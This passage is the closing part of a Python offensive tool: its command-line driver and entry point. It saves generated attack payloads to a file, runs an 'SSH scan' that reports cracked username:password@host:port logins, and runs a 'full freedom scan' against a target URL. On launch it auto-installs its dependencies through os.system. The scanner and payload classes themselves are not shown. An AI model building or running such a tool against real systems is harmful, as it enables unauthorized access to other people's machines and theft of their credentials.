        if args.output:
            with open(args.output, 'w') as f:
                for name, payload in payloads.items():
                    f.write(f"\n[{name.upper()}]\n")
                    f.write(payload + "\n")
                    f.write("-" * 40 + "\n")
            
            print(f"\n{Fore.GREEN}[✓] Payloads saved to {args.output}")
        
        sys.exit(0)
    
    if not args.url:
        print(f"{Fore.RED}[!] Target URL required")
        parser.print_help()
        sys.exit(1)
    
    if args.ssh_scan:
        # SSH scan mode
        print(f"{Fore.CYAN}[*] Starting SSH scan on {args.url}")
        
        ssh_scanner = SSHScanner()
        
        ports = [args.port] if args.port else Config.SSH_PORTS
        results = ssh_scanner.scan_host(args.url, ports)
        
        if results:
            print(f"\n{Fore.GREEN}{'='*60}")
            print(f"{Fore.GREEN}[✓] SSH SCAN RESULTS")
            print(f"{Fore.GREEN}{'='*60}")
            
            for result in results:
                print(f"\n{Fore.CYAN}[+] {result['username']}:{result['password']}@{result['host']}:{result['port']}")
                print(f"{Fore.WHITE}   User: {result['user']}")
                print(f"{Fore.WHITE}   System: {result['system']}")
            
            if args.output:
                with open(args.output, 'w') as f:
                    json.dump(results, f, indent=2)
                print(f"\n{Fore.GREEN}[✓] Results saved to {args.output}")
        else:
            print(f"{Fore.RED}[!] No SSH access found")
    
    elif args.full_scan:
        # Full freedom scan mode
        if not args.url.startswith(('http://', 'https://')):
            args.url = 'http://' + args.url
        
        scanner = FreedomScanner(args.url, args.threads)
        results = scanner.perform_full_scan()
        
        if args.output:
            with open(args.output, 'w', encoding='utf-8') as f:
                json.dump(results, f, indent=2, ensure_ascii=False)
            print(f"\n{Fore.GREEN}[✓] Full results saved to {args.output}")
    
    else:
        print(f"{Fore.YELLOW}[!] No scan mode selected")
        parser.print_help()

# ==================== MAIN ====================
if __name__ == "__main__":
    try:
        # Check for required dependencies
        try:
            import paramiko
        except ImportError:
            print(f"{Fore.RED}[!] Paramiko not installed. Installing...")
            os.system("pip install paramiko colorama dnspython")
            print(f"{Fore.GREEN}[✓] Dependencies installed. Please restart.")
            sys.exit(0)
        
        if len(sys.argv) > 1:
            cli_mode()
        else:
            menu = InteractiveMenu()
            menu.run()
            
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Program interrupted by user")
        sys.exit(0)
    except Exception as e:
        print(f"{Fore.RED}[!] Critical error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
